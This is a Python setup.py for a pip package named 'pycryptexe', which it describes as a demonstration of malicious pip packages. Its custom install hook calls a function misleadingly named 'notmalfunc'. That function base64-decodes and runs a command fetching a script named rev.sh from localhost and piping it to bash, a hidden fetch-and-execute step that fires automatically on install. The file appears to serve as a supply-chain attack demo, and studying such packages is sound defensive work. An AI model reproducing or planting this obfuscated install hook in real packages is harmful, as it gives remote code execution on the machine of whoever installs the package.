import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os
import subprocess


def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK"))

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "pycryptexe",
    version = "1.1.3",
    author = "JungleBrothers",
    author_email = "junglebrothers@gmail.com",
    description = "A test package to demonstrate malicious pip packages",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/junglebrothers/pycryptexe",
    project_urls = {
        "Bug Tracker": "https://github.com/junglebrothers/pycryptexe/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
